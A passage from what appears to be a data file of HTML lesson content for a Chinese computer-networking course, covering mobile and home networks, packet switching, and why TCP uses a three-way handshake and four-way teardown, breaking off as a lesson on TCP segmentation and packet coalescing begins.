Switch）</strong>。</p>\n<p data-nodeid="12925">比如说，你要传递一首 2Mb 的 MP3 的歌曲，歌曲本身不是一次传输完成的，而是被拆分成很多个封包。每个封包只有歌曲中的一部分数据，而封包一旦遇到岔路口，就需要封包交换技术帮助每个封包选择最合理的路径。</p>\n<p data-nodeid="12926">在网络中，常见的具有交换能力的设备是<strong data-nodeid="13025">路由器（Router）和链路层交换机（Link-Layer Switch）</strong>。通常情况下，两个网络可以通过路由器进行连接，多台设备可以通过交换机进行连接。<strong data-nodeid="13026">但是路由器通常也具有交换机的功能</strong>。</p>\n<p data-nodeid="12927">在上图 1 中，公司内部网络也被分成了多级子网。每个路由器、交换机构成一级子网。最高级的路由器在公司网络的边缘，它可以将网络内部节点连接到其他的网络（网络外部）。本地网络提供商（ISP）提供的互联网先到达边缘的路由器，然后再渗透到内部的网络节点。公司内部的若干服务器可以通过交换机形成一个局域网络；公司内部的办公设备，比如电脑和笔记本，也可以通过无线路由器或者交换机形成局域网络。<strong data-nodeid="13032">局域网络之间，可以通过路由器、交换机进行连接，从而构成一个更大的局域网</strong>。</p>\n<h4 data-nodeid="12928">移动网络</h4>\n<p data-nodeid="12929">前面我们提到，网络传输需要通信链路（Communication Link），而通信链路是一个抽象概念。这里说的抽象，就是面向对象中抽象类和继承类的关系，比如同轴电缆是通信链路，无线信号的发送接收器可以构成通信链路，蓝牙信道也可以构成通信链路。</p>\n<p data-nodeid="12930">在移动网络中，无线信号构成了通信链路。在移动网络的设计中，通信的核心被称作<strong data-nodeid="13040">蜂窝塔（Cellular Tower），有时候也称作基站（BaseStation）</strong>。之所以有这样的名称，是因为每个蜂窝塔只覆盖一个六边形的范围，如果要覆盖一个很大的区域就需要很多的蜂窝塔（六边形）排列在一起，像极了蜜蜂的巢穴。这种六边形的结构，可以让信号无死角地覆盖。想象一下，如果是圆形结构，那么圆和圆之间就会有间隙，造成一部分无法覆盖的信号死角，而六边形就完美地解决了这个问题。</p>\n<p data-nodeid="12931"><img src="https://s0.lgstatic.com/i/image6/M01/38/64/Cgp9HWB5O86APsowAACbWDSSmH4919.png" alt="Drawing 6.png" data-nodeid="13043"></p>\n<div data-nodeid="12932"><p style="text-align:center">图 3：蜂巢网络示意图</p></div>\n<p data-nodeid="12933">对于构成移动网络最小的网络结构——蜂窝网络来说，构造大体如图 4 所示：</p>\n<p data-nodeid="12934"><img src="https://s0.lgstatic.com/i/image6/M00/38/6D/CioPOWB5O9qATnBsAACZHrgoKJM926.png" alt="Drawing 8.png" data-nodeid="13047"></p>\n<div data-nodeid="12935"><p style="text-align:center">图 4：蜂窝移动网络构成</p></div>\n<p data-nodeid="12936">图 4 中，国家或全球网络提供商将网络供给处于蜂窝网络边缘的路由器，路由器连接蜂窝塔，再通过蜂窝塔（基站）提供给处于六边形地区中的设备。通常是国家级别的网络服务提供商负责部署基站，比如中国电信、中国联通。将网络提供给一个子网的行为，通常称为<strong data-nodeid="13057">网络提供（Network Provider）</strong>，反过来，对一个子网连接提供商的网络，称为<strong data-nodeid="13058">网络接入（Network Access）</strong>。</p>\n<p data-nodeid="12937">随着移动网络的发展，一个蜂窝网格中的设备越来越多，也出现了基站覆盖有重叠关系的网格，如下图 5 所示：</p>\n<p data-nodeid="12938"><img src="https://s0.lgstatic.com/i/image6/M00/38/6D/CioPOWB5O-iAar0QAABo9zrq_yU298.png" alt="Drawing 10.png" data-nodeid="13062"></p>\n<div data-nodeid="12939"><p style="text-align:center">图 5 ：基站重叠的网格和边缘计算节点</p></div>\n<p data-nodeid="12940">这样设计的好处是，当一个基站过载、出现故障，或者用户设备周边信号出现不稳定，就可以切换到另一个基站的网络，不影响用户继续使用网络服务。</p>\n<p data-nodeid="12941">另一方面，在一定范围内的区域，离用户较近的地方还可以部署服务器，帮助用户完成计算。这相当于计算资源的下沉，称为<strong data-nodeid="13069">边缘计算</strong>。相比中心化的计算，边缘计算延迟低、链路短，能够将更好的体验带给距离边缘计算集群最近的节点。从而让用户享受到更优质、延迟更低、算力更强的服务。</p>\n<p data-nodeid="12942"><img src="https://s0.lgstatic.com/i/image6/M00/38/6D/CioPOWB5O_mAPASCAACEaOOPkv0403.png" alt="Drawing 12.png" data-nodeid="13072"></p>\n<div data-nodeid="12943"><p style="text-align:center">图 6：边缘计算</p></div>\n<h4 data-nodeid="12944">家用网络</h4>\n<p data-nodeid="12945">还有一个值得讨论的是家用网络。近些年，家用联网设备越来越多。比如说冰箱、空调、扫地机器人、灯光、电动窗帘……</p>\n<p data-nodeid="12946"><img src="https://s0.lgstatic.com/i/image6/M01/38/65/Cgp9HWB5PAaAI4_7AADtVLTTA4U030.png" alt="Drawing 14.png" data-nodeid="13077"></p>\n<div data-nodeid="12947"><p style="text-align:center">图 7： 家用网络结构</p></div>\n<p data-nodeid="12948">如上图 7 所示，家用网络现在已经发展成一种网格状的连接。一方面家用网络会通过路由器接入本地 ISP 提供的网络服务。另一方面，一些设备，比如电脑、笔记本、手机、冰箱等都可以直接和路由器连接。<strong data-nodeid="13083">路由器也承担了链路层网关的作用，作为家用电器之间信息的交换设备</strong>。</p>\n<p data-nodeid="12949">还有一些家用设备，比如说 10 多块钱的灯泡，不太适合内部再嵌入一个几十块钱可以接收 WI-FI 的芯片，这个时候就可以考虑用蓝牙控制电灯。路由器提供蓝牙不现实，因此一些家用电器也承担了蓝牙设备的控制器——比如说智能音箱。上图 7 中的智能音箱把家用网络带向了一个网格状，有的设备会同时连接路由器（WI-FI）和智能音箱，这样手机和音箱都可以直接控制这些设备。这样的设计，即便网络断开，仍然可以控制这些家用设备。</p>\n<h3 data-nodeid="12950">整体关系</h3>\n<p data-nodeid="12951">以上，我们了解了 3 种常见的网络：公司网络、移动网络和家用网络。它们的整体关系如下图 8 所示：</p>\n<p data-nodeid="12952"><img src="https://s0.lgstatic.com/i/image6/M00/38/6D/CioPOWB5PBSAHzzqAAG9lxafSkI945.png" alt="Drawing 16.png" data-nodeid="13089"></p>\n<div data-nodeid="12953"><p style="text-align:center">图 8：互联网整体结构</p></div>\n<p data-nodeid="12954">最顶部的全球或国家大型的 ISP 之间联网，构成了网络的主干。然后区域性的 ISP 承接主干网络，在这个基础之上再向家庭和公司提供接入服务。<strong data-nodeid="13095">移动蜂窝网络因为部署复杂，往往也是由大型 ISP 直接提供</strong>。</p>\n<h3 data-nodeid="12955">数据的传输</h3>\n<p data-nodeid="12956">上述的网络结构中，由庞大数目的个人、公司、组织、基站，形成一个个网络。在这些网络中，传递数据不是一件容易的事情。</p>\n<p data-nodeid="12957">为了传递数据，在网络中有几个特别重要的抽象。最终提供服务或者享受服务的设备，称为<strong data-nodeid="13112">终端（Terminal），<strong data-nodeid="13111">或者</strong>端系统（End System）</strong>，有时候简单称为<strong data-nodeid="13113">主机（Host）</strong>。比如说：电脑、手机、冰箱、汽车等，我们都可以看作是一个主机（Host）。</p>\n<p data-nodeid="12958">然后，我们可以把网络传输分成两类，一类是端到端（Host-to-Host）的能力，由 TCP/IP 协议群提供。还有一类是广播的能力，是一对多、多对多的能力，可以看作是端到端（Host-to-Host）能力的延伸。</p>\n<p data-nodeid="12959">你可以思考一下，一个北京的主机（Host）向一个深圳的主机（Host）发送消息。那么，中间会穿越大量的网络节点，这些节点可以是路由器、交换机、基站等。在发送消息的过程中，可能跨越很多网络、通过很多边缘，也可能会通过不同的网络提供商提供的网络……而且，传输过程中，可能会使用不同材质的通信链路（Communication Link），比如同轴电缆、双绞线、光纤，或者通过无线传输的 WI-FI、卫星等。</p>\n<p data-nodeid="12960">网络基础设施往往不能一次性传输太大的数据量，因此通常会将数据分片传输。比如传输一个 MP3，我们会将 MP3 内容切分成很多个组，每个组也称作一个封包，英文都是 Packet。这样，如果一个封包损坏，只需要重发损坏的封包，而不需要重发所有数据。你可以类比下中文的活字印刷技术。</p>\n<p data-nodeid="12961">另一方面，网络中两点间的路径非常多，如果一条路径阻塞了，部分封包可以考虑走其他路径。发送端将数据拆分成封包（Packet），封包在网络中遇到岔路，由交换器和路由器节点决定走向，图 9 中是对封包交换技术的一个演示。</p>\n<p data-nodeid="12962"><img src="https://s0.lgstatic.com/i/image6/M00/38/82/Cgp9HWB5WbqAVlGaAHeNbdcL7hg030.gif" alt="Packet_Switching.gif" data-nodeid="13122"></p>\n<div data-nodeid="12963"><p style="text-align:center">图 9：封包交换技术</p></div>\n<h3 data-nodeid="12964">总结</h3>\n<p data-nodeid="12965">互联网是一个非常庞大的结构，从整体来看，互联网是一个立体的、庞大的网状结构。但是如果将它放大、再放大，将镜头拉近，在微观层面，我们会看到一个个网络、一台台设备，还会看到大量的封包在交换、有设备在不断地改变封包的走向、损坏的封包被重发、一个个光电信号被转化和传输。</p>\n<p data-nodeid="12966">这个过程看似复杂，但任何一个局部的设计都在井然有序地运行着。每次我想要深入研究互联网的设计时，都不禁再次感叹它的浩瀚——如今你看到的网络，是经过几个时代的发展沉淀下来的“宝藏”。不是某个人、某个团队就可以设计出来。所以从这个角度，我们可以把计算机网络看作是优秀的分层设计、精密的模块组装、准确的数值运算等一系列设计思想、工程方法的集合。如果你想学习软件架构，互联网就是一个最好的参照。</p>\n<p data-nodeid="14462" class="te-preview-highlight">这一讲，我带你对互联网的结构做了一次简单的漫游。下一讲，我们将开始从局部入手，继续学习计算机网络“02 | 传输层协议 TCP：TCP 为什么握手是 3 次、挥手是 4 次？”。</p>\n\n\n\n\n<p data-nodeid="12968" class="">发现求知的乐趣，我是林䭽。感谢你学习本次课程，再见！</p>',
        article_title: "01 | 漫游互联网：什么是蜂窝移动网络？",
        title: "01 | 漫游互联网：什么是蜂窝移动网络？",
        id: 7265,
      },
      {
        content:
          '<p data-nodeid="1429" class="">TCP 和 UDP 是今天应用最广泛的传输层协议，拥有最核心的垄断地位。今天互联网的整个传输层，几乎都是基于这两个协议打造的。无论是应用开发、框架设计选型、做底层和优化，还是定位线上问题，只要碰到网络，就逃不开 TCP 协议相关的知识。在面试中 <strong data-nodeid="1543">TCP</strong> 一直是一个高频考察内容，外加 TCP 关联的知识比较多，因此面试题五花八门。</p>\n<p data-nodeid="1430">在介绍今天的主题之前，我先提一道高频面试题：<strong data-nodeid="1548">TCP 协议为什么握手是 3 次，挥手却是 4 次？下面请你带着这个问题，开启今天的学习。</strong></p>\n<h3 data-nodeid="1431">TCP 协议</h3>\n<p data-nodeid="1432">要想把开篇这道面试题回答得漂亮，我们有必要先说一下概念，然后我再逐字给你解读。</p>\n<p data-nodeid="1433"><strong data-nodeid="1555">TCP（Transport Control Protocol）是一个传输层协议，提供 Host-To-Host 数据的可靠传输，支持全双工，是一个连接导向的协议</strong>。</p>\n<p data-nodeid="1434">这里面牵涉很多概念，比如主机到主机、连接、会话、双工/单工及可靠性等，接下来我会为你逐一解释。</p>\n<h4 data-nodeid="1435">主机到主机（Host-To-Host）</h4>\n<p data-nodeid="1436"><strong data-nodeid="1562">TCP 提供的是 Host-To-Host 传输，一台主机通过 TCP 发送数据给另一台主机</strong>。这里的主机（Host）是一个抽象的概念，可以是手机、平板、手表等。收发数据的设备都是主机，所以双方是平等的。</p>\n<p data-nodeid="1437"><img src="https://s0.lgstatic.com/i/image6/M00/38/6D/Cgp9HWB5RAmAZRwzAACtAP-CPWs242.png" alt="Drawing 1.png" data-nodeid="1565"></p>\n<p data-nodeid="1438"><strong data-nodeid="1570">TCP 协议往上是应用到应用（Application-To-Application）的协议</strong>。什么是应用到应用的协议呢？比如你用微信发信息给张三，你的微信客户端、微信聊天服务都是应用。微信有自己的聊天协议，微信的聊天协议是应用到应用的协议；如果微信的聊天协议想要工作，就需要一个主机到主机的协议帮助它实现通信。</p>\n<p data-nodeid="1439">而 TCP 上层有太多的应用，不仅仅有微信，还有原神、抖音、网易云音乐……因此 TCP 上层的应用层协议使用 TCP 能力的时候，需要告知 TCP 是哪个应用——这就是<strong data-nodeid="1580">端口号</strong>。<strong data-nodeid="1581">端口号用于区分应用</strong>，下文中我们还会详细讨论。</p>\n<p data-nodeid="1440">TCP 要实现主机到主机通信，就需要知道主机们的<strong data-nodeid="1587">网络地址（IP 地址）</strong>，但是 TCP 不负责实际地址到地址（Address-To-Address）的传输，因此 TCP 协议把 IP 地址给底层的互联网层处理。</p>\n<p data-nodeid="3961" class=""><strong data-nodeid="3970">互联网层，也叫网络层（Network Layer），提供地址到地址的通信</strong>，IP 协议就在这一层工作。互联网层解决地址到地址的通信，但是不负责信号在具体两个设备间传递。因此，网络层会调用下方的<strong data-nodeid="3971">链路层</strong>在两个相邻设备间传递信息。当信号在两个设备间传递的时候，科学家又设计出了物理层封装最底层的物理设备、传输介质等，由最下方的物理层提供最底层的传输能力。</p>\n\n\n\n\n<p data-nodeid="1442">以上的 5 层架构，我们称为<strong data-nodeid="1611">互联网协议群</strong>，也称作 <strong data-nodeid="1612">TCP/IP 协议群</strong>。<strong data-nodeid="1613">总结下，主机到主机（Host-To-Host）为应用提供应用间通信的能力</strong>。</p>\n<h4 data-nodeid="1443">什么是连接和会话？</h4>\n<p data-nodeid="1444">下一个关联的概念是<strong data-nodeid="1620">连接（Connection）——连接是数据传输双方的契约</strong>。</p>\n<p data-nodeid="1445">连接是通信双方的一个约定，目标是让两个在通信的程序之间产生一个默契，保证两个程序都在线，而且尽快地响应对方的请求，这就是<strong data-nodeid="1626">连接（Connection）</strong>。</p>\n<p data-nodeid="1446">设计上，连接是一种传输数据的行为。传输之前，建立一个连接。具体来说，数据收发双方的内存中都建立一个用于维护数据传输状态的对象，比如双方 IP 和端口是多少？现在发送了多少数据了？状态健康吗？传输速度如何？等。所以，<strong data-nodeid="1632">连接是网络行为状态的记录</strong>。</p>\n<p data-nodeid="1447">和连接关联的还有一个名词，叫作<strong data-nodeid="1638">会话（Session），会话是应用的行为</strong>。比如微信里张三和你聊天，那么张三和你建立一个会话。你要和张三聊天，你们创建一个聊天窗口，这个就是会话。你开始 Typing，开始传输数据，你和微信服务器间建立一个连接。如果你们聊一段时间，各自休息了，约定先不要关微信，1 个小时后再回来。那么连接会断开，因为聊天窗口没关，所以会话还在。</p>\n<p data-nodeid="1448">在有些系统设计中，会话会自动重连（也就是重新创建连接），或者帮助创建连接。 此外，会话也负责在多次连接中保存状态，比如 HTTP Session 在多次 HTTP 请求（连接）间保持状态（如用户信息）。</p>\n<p data-nodeid="1449"><strong data-nodeid="1644">总结下，会话是应用层的概念，连接是传输层的概念</strong>。</p>\n<h4 data-nodeid="1450">双工/单工问题</h4>\n<p data-nodeid="1451">接下来我们聊聊什么是<strong data-nodeid="1651">双工/单工</strong>。</p>\n<p data-nodeid="1452">在任何一个时刻，如果数据只能单向发送，就是<strong data-nodeid="1665">单工</strong>，所以单工需要至少一条线路。如果在某个时刻数据可以向一个方向传输，也可以向另一个方向反方向传输，而且交替进行，叫作<strong data-nodeid="1666">半双工</strong>；半双工需要至少 1 条线路。最后，如果任何时刻数据都可以双向收发，这就是<strong data-nodeid="1667">全双工</strong>，全双工需要大于 1 条线路。当然这里的线路，是一个抽象概念，你可以并发地处理信号，达到模拟双工的目的。</p>\n<p data-nodeid="1453"><strong data-nodeid="1676">TCP 是一个双工协议，数据任何时候都可以双向传输</strong>。这就意味着客户端和服务端可以平等地发送、接收信息。正因为如此，客户端和服务端在 TCP 协议中有一个平等的名词——<strong data-nodeid="1677">Host（主机）</strong>。</p>\n<h4 data-nodeid="1454">什么是可靠性？</h4>\n<p data-nodeid="1455">上文提到 TCP 提供可靠性，那么可靠性是什么？</p>\n<p data-nodeid="1456"><strong data-nodeid="1688">可靠性指数据保证无损传输</strong>。如果发送方按照顺序发送，然后数据无序地在网络间传递，就必须有一种算法在接收方将数据恢复原有的顺序。另外，如果发送方同时要把消息发送给多个接收方，这种情况叫作<strong data-nodeid="1689">多播</strong>，可靠性要求每个接收方都无损收到相同的副本。多播情况还有强可靠性，就是如果有一个消息到达任何一个接收者，那么所有接受者都必须收到这个消息。说明一下，本专栏中，我们都是基于单播讨论可靠性。</p>\n<h3 data-nodeid="1457">TCP 的握手和挥手</h3>\n<p data-nodeid="1458">TCP 是一个连接导向的协议，设计有建立连接（握手）和断开连接（挥手）的过程。TCP 没有设计会话（Session），因为会话通常是一个应用的行为。</p>\n<h4 data-nodeid="1459">TCP 协议的基本操作</h4>\n<p data-nodeid="1460">TCP 协议有这样几个基本操作：</p>\n<ul data-nodeid="1461">\n<li data-nodeid="1462">\n<p data-nodeid="1463">如果一个 Host 主动向另一个 Host 发起连接，称为 SYN（Synchronization），请求同步；</p>\n</li>\n<li data-nodeid="1464">\n<p data-nodeid="1465">如果一个 Host 主动断开请求，称为 FIN（Finish），请求完成；</p>\n</li>\n<li data-nodeid="1466">\n<p data-nodeid="1467">如果一个 Host 给另一个 Host 发送数据，称为 PSH（Push），数据推送。</p>\n</li>\n</ul>\n<p data-nodeid="1468">以上 3 种情况，接收方收到数据后，都需要给发送方一个 ACK（Acknowledgement）响应。请求/响应的模型是可靠性的要求，如果一个请求没有响应，发送方可能会认为自己需要重发这个请求。</p>\n<h4 data-nodeid="1469">建立连接的过程（三次握手）</h4>\n<p data-nodeid="1470">因为要保持连接和可靠性约束，TCP 协议要保证每一条发出的数据必须给返回，返回数据叫作 ACK（也就是响应）。</p>\n<p data-nodeid="1471">按照这个思路，你可以看看建立连接是不是需要 3 次握手：</p>\n<p data-nodeid="1472"><img src="https://s0.lgstatic.com/i/image6/M00/3A/20/CioPOWB-RYSASfPkAAEen4ZR3gw297.png" alt="619.png" data-nodeid="1703"></p>\n<ol data-nodeid="1473">\n<li data-nodeid="1474">\n<p data-nodeid="1475">客户端发消息给服务端（SYN）</p>\n</li>\n<li data-nodeid="1476">\n<p data-nodeid="1477">服务端准备好进行连接</p>\n</li>\n<li data-nodeid="1478">\n<p data-nodeid="1479">服务端针对客户端的 SYN 给一个 ACK</p>\n</li>\n</ol>\n<p data-nodeid="1480">你可以能会问，到这里不就可以了吗？2 次握手就足够了。但其实不是，因为服务端还没有确定客户端是否准备好了。比如步骤 3 之后，服务端马上给客户端发送数据，这个时候客户端可能还没有准备好接收数据。因此还需要增加一个过程。</p>\n<p data-nodeid="1481">接下来还会发生以下操作：</p>\n<ol start="4" data-nodeid="1482">\n<li data-nodeid="1483">\n<p data-nodeid="1484">服务端发送一个 SYN 给客户端</p>\n</li>\n<li data-nodeid="1485">\n<p data-nodeid="1486">客户端准备就绪</p>\n</li>\n<li data-nodeid="1487">\n<p data-nodeid="1488">客户端给服务端发送一个 ACK</p>\n</li>\n</ol>\n<p data-nodeid="1489">你可能会问，上面不是 6 个步骤吗？ 怎么是 3 次握手呢？下面我们一起分析一下其中缘由。</p>\n<ul data-nodeid="1490">\n<li data-nodeid="1491">\n<p data-nodeid="1492">步骤 1 是 1 次握手；</p>\n</li>\n<li data-nodeid="1493">\n<p data-nodeid="1494">步骤 2 是服务端的准备，不是数据传输，因此不算握手；</p>\n</li>\n<li data-nodeid="1495">\n<p data-nodeid="1496">步骤 3 和步骤 4，因为是同时发生的，可以合并成一个 SYN-ACK 响应，作为一条数据传递给客户端，因此是第 2 次握手；</p>\n</li>\n<li data-nodeid="1497">\n<p data-nodeid="1498">步骤 5 不算握手；</p>\n</li>\n<li data-nodeid="1499">\n<p data-nodeid="1500">步骤 6 是第 3 次握手。</p>\n</li>\n</ul>\n<p data-nodeid="1501">为了方便你理解步骤 3 和步骤 4，这里我画了一张图。可以看到下图中 SYN 和 ACK 被合并了，因此建立连接一共需要 3 次握手，过程如下图所示：</p>\n<p data-nodeid="1502"><img src="https://s0.lgstatic.com/i/image6/M00/38/6D/Cgp9HWB5RCqAVfhiAADJmfGn2O0616.png" alt="Drawing 4.png" data-nodeid="1721"></p>\n<p data-nodeid="1503">从上面的例子中，你可以进一步思考 SYN、ACK、PSH 这些常见的标识位（Flag）在传输中如何表示。</p>\n<p data-nodeid="1504">一种思路是为 TCP 协议增加协议头。在协议头中取多个位（bit），其中 SYN、ACK、PSH 都占有 1 个位。比如 SYN 位，1 表示 SYN 开启，0 表示关闭。因此，SYN-ACK 就是 SYN 位和 ACK 位都置 1。这种设计，我们也称为<strong data-nodeid="1734">标识（Flag）</strong>。标识位是放在 TCP 头部的，关于标识位和 TCP 头的内容，我会在“<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7268" data-nodeid="1732">04 | TCP 的稳定性：滑动窗口和流速控制是怎么回事？</a>”中详细介绍。</p>\n<h4 data-nodeid="1505">断开连接的过程（4 次挥手）</h4>\n<p data-nodeid="1506">继续上面的思路，如果断开连接需要几次握手？给你一些提示，你可以在脑海中这样构思。</p>\n<ol data-nodeid="1507">\n<li data-nodeid="1508">\n<p data-nodeid="1509">客户端要求断开连接，发送一个断开的请求，这个叫作（FIN）。</p>\n</li>\n<li data-nodeid="1510">\n<p data-nodeid="1511">服务端收到请求，然后给客户端一个 ACK，作为 FIN 的响应。</p>\n</li>\n<li data-nodeid="1512">\n<p data-nodeid="1513">这里你需要思考一个问题，<strong data-nodeid="1746">可不可以像握手那样马上传 FIN 回去</strong>？<br>\n其实这个时候服务端不能马上传 FIN，因为断开连接要处理的问题比较多，比如说服务端可能还有发送出去的消息没有得到 ACK；也有可能服务端自己有资源要释放。因此断开连接不能像握手那样操作——将两条消息合并。所以，服务端经过一个等待，确定可以关闭连接了，再发一条 FIN 给客户端。</p>\n</li>\n<li data-nodeid="1514">\n<p data-nodeid="1515">客户端收到服务端的 FIN，同时客户端也可能有自己的事情需要处理完，比如客户端有发送给服务端没有收到 ACK 的请求，客户端自己处理完成后，再给服务端发送一个 ACK。</p>\n</li>\n</ol>\n<p data-nodeid="1516">经过以上分析，就可以回答上面这个问题了。是不是刚刚好 4 次挥手？过程如下图所示：</p>\n<p data-nodeid="1517"><img src="https://s0.lgstatic.com/i/image6/M00/3D/55/CioPOWCTwu-AD9PgAABp1yJqsPI439.png" alt="图片2.png" data-nodeid="1751"></p>\n<h4 data-nodeid="1518">总结</h4>\n<p data-nodeid="1519">在学习 3 次握手、4 次挥手时，你一定要理解为什么这么设计，而不是死记硬背。最后。我们一起总结一下今天的重点知识。</p>\n<ol data-nodeid="1520">\n<li data-nodeid="1521">\n<p data-nodeid="1522">TCP 提供连接（Connection），让双方的传输更加稳定、安全。</p>\n</li>\n<li data-nodeid="1523">\n<p data-nodeid="1524">TCP 没有直接提供会话，因为应用对会话的需求多种多样，比如聊天程序会话在保持双方的聊天记录，电商程序会话在保持购物车、订单一致，所以会话通常在 TCP 连接上进一步封装，在应用层提供。</p>\n</li>\n<li data-nodeid="1525">\n<p data-nodeid="1526">TCP 是一个面向连接的协议（Connection -oriented Protocol），说的就是 TCP 协议参与的双方（Host）在收发数据之前会先建立连接。后面我们还会学习 UDP 协议，UDP 是一个面向报文（Datagram-oriented）的协议——协议双方不需要建立连接，直接传送报文（数据）。</p>\n</li>\n<li data-nodeid="1527">\n<p data-nodeid="1528">最后，连接需要消耗更多的资源。比如说，在传输数据前，必须先协商建立连接。因此，不是每种场景都应该用连接导向的协议。像视频播放的场景，如果使用连接导向的协议，服务端每向客户端推送一帧视频，客户端都要给服务端一次响应，这是不合理的。</p>\n</li>\n</ol>\n<p data-nodeid="1529"><strong data-nodeid="1761">那么通过这一讲的学习，你现在可以尝试来回答本讲关联的面试题目：TCP 为什么是 3 次握手，4 次挥手？</strong></p>\n<p data-nodeid="1530">【<strong data-nodeid="1767">解析</strong>】TCP 是一个双工协议，为了让双方都保证，建立连接的时候，连接双方都需要向对方发送 SYC（同步请求）和 ACK（响应）。</p>\n<p data-nodeid="1531">握手阶段双方都没有烦琐的工作，因此一方向另一方发起同步（SYN）之后，另一方可以将自己的 ACK 和 SYN 打包作为一条消息回复，因此是 3 次握手——需要 3 次数据传输。</p>\n<p data-nodeid="1532">到了挥手阶段，双方都可能有未完成的工作。收到挥手请求的一方，必须马上响应（ACK），表示接收到了挥手请求。<strong data-nodeid="1774">类比现实世界中，你收到一个 Offer，出于礼貌你先回复考虑一下，然后思考一段时间再回复 HR 最后的结果</strong>。最后等所有工作结束，再发送请求中断连接（FIN），因此是 4 次挥手。</p>\n<h3 data-nodeid="1533">思考题</h3>\n<p data-nodeid="1534"><strong data-nodeid="1780">最后我再给你出一道需要查资料的思考题：一台内存在 8G 左右的服务器，可以同时维护多少个连接</strong>？</p>\n<p data-nodeid="1535">你可以把你的答案、思路或者课后总结写在留言区，这样可以帮助你产生更多的思考，这也是构建知识体系的一部分。经过长期的积累，相信你会得到意想不到的收获。如果你觉得今天的内容对你有所启发，欢迎分享给身边的朋友。期待看到你的思考！</p>\n<p data-nodeid="1536">这一讲就到这里，下一讲我们将学习“03 | TCP 的封包格式：TCP 为什么要粘包和拆包？” ，继续深挖 TCP 协议，从可靠性传输的角度开启一片新领域，切入对 TCP 更深层次运行机制的探讨。</p>\n<p data-nodeid="1537" class="">发现求知的乐趣，我是林䭽。感谢你学习本次课程，再见！</p>',
        article_title:
          "02 | 传输层协议 TCP：TCP 为什么握手是 3 次、挥手是 4 次？",
        title: "02 | 传输层协议 TCP：TCP 为什么握手是 3 次、挥手是 4 次？",
        id: 7266,
      },
      {
        content:
          '<p data-nodeid="1373" class="">今天我们将从<strong data-nodeid="1475">稳定性</strong>角度深挖 <strong data-nodeid="1476">TCP 协议的运作机制</strong>。如今，大半个互联网都建立在 TCP 协议之上，我们使用的 HTTP 协议、消息队列、存储、缓存，都需要用到 TCP 协议——这是因为 <strong data-nodeid="1477">TCP 协议提供了可靠性</strong>。简单来说，可靠性就是让数据无损送达。但若是考虑到成本，就会变得非常复杂——因为还需要尽可能地提升吞吐量、降低延迟、减少丢包率。</p>\n<p data-nodeid="1374">TCP 协议具有很强的实用性，而可靠性又是 TCP 最核心的能力，所以理所当然成为面试官们津津乐道的问题。具体来说，从一个终端有序地发出多个数据包，经过一个复杂的网络环境，到达目的地的时候会变得无序，而可靠性要求数据恢复到原始的顺序。这里我先给你提出两个问题：</p>\n<ul data-nodeid="1375">\n<li data-nodeid="1376">\n<p data-nodeid="1377">TCP 协议是如何恢复数据的顺序的？</p>\n</li>\n<li data-nodeid="1378">\n<p data-nodeid="1379">拆包和粘包的作用是什么？</p>\n</li>\n</ul>\n<p data-nodeid="1380">下面请你带着这两个问题开始今天的学习。</p>\n<h3 data-nodeid="1381">TCP 的拆包和粘包</h3>\n<p data-nodeid="1382"><strong data-nodeid="1487">TCP 是一个传输层协议</strong>。TCP 发送数据的时候，往往不会将数据一次性发送，像下图这样：</p>\n<p data-nodeid="1383"><img src="https://s0.lgstatic.com/i/image6/M01/3A/3C/Cgp9HWB-mySAMiRJAACvL4JE7Ow394.png" alt="Drawing 1.png" data-nodeid="1490"></p>\n<p data-nodeid="1384">而是将数据拆分成很多个部分，然后再逐个发送。像下图这样：</p>\n<p data-nodeid="1385"><img src="https://s0.lgstatic.com/i/image6/M00/3A/44/CioPOWB-myyARws0AADwpYVdoRk460.png" alt="Drawing 3.png" data-nodeid="1494"></p>\n<p data-nodeid="1386">同样的，在目的地，TCP 协议又需要逐个接收数据。<strong data-nodeid="1500">请你思考，TCP 为什么不一次发送完所有的数据</strong>？比如我们要传一个大小为 10M 的文件，对于应用层而言，就是一次传送完成的。而传输层的协议为什么不选择将这个文件一次发送完呢？</p>\n<p data-nodeid="1387">这里有很多原因，比如为了稳定性，一次发送的数据越多，出错的概率越大。再比如说为了效率，网络中有时候存在着并行的路径，拆分数据包就能更好地利用这些并行的路径。再有，比如发送和接收数据的时候，都存在着缓冲区。如下图所示：</p>\n<p data-nodeid="1388"><img src="https://s0.lgstatic.com/i/image6/M01/3A/3C/Cgp9HWB-mz2ALAO6AAFJNuQ9-SU088.png" alt="Drawing 5.png" data-nodeid="1504"></p>\n<p data-nodeid="1389">缓冲区是在内存中开辟的一块区域，目的是缓冲。因为大量的应用频繁地通过网卡收发数据，这个时候，网卡只能一个一个处理应用的请求。当网卡忙不过来的时候，数据就需要排队，也就是将数据放入缓冲区。如果每个应用都随意发送很大的数据，可能导致其他应用实时性遭到破坏。</p>\n<p data-nodeid="1390">还有一些原因我们在<a href="https://shenceyun.lagou.com/t/Axo?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1509">《重学操作系统》</a>专栏的“<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=478#/detail/pc?id=4633&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1515">24 | 虚拟内存 ：一个程序最多能使用多少内存？</a>”中讨论过。比如内存的最小分配单位是页表，如果数据的大小超过一个页表，可能会存在页面置换问题，造成性能的损失。如果你对这一部分的知识感兴趣，可以学习我在拉勾教育推出的<a href="https://shenceyun.lagou.com/t/Axo?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1519">《重学操作系统》</a>专栏。</p>\n<p data-nodeid="1391">总之，方方面面的原因：<strong data-nodeid="1530">在传输层封包不能太大</strong>。这种限制，往往是以缓冲区大小为单位的。也就是 TCP 协议，会将数据拆分成不超过缓冲区大小的一个个部分。每个部分有一个独特的名词，叫作 <strong data-nodeid="1531">TCP 段（TCP Segment）</strong>。</p>\n<p data-nodeid="1392">在接收数据的时候，一个个 TCP 段又被重组成原来的数据。</p>\n<p data-nodeid="1393">像这样，数据经过拆分，然后传输，然后在目的地重组，俗称<strong data-nodeid="1542">拆包</strong>。所以拆包是将数据拆分成多个 TCP 段传输。那么粘包是什么呢？有时候，如果发往一个目的地的多个数据太小了，为了防止多次发送占用资源，TCP 协议有可能将它们合并成一个 TCP 段发送，在目的地再还原成多个数据，这个过程俗称<strong data-nodeid="1543">粘包</strong>。所以粘包是将多个数据合并成一个 TCP 段发送。</p>\n<h3 data-nodeid="1394">TCP Segment</h3>\n<p data-nodeid="1395">那么一个 TCP 段长什么样子呢？下图是一个 TCP 段的格式：</p>\n<p 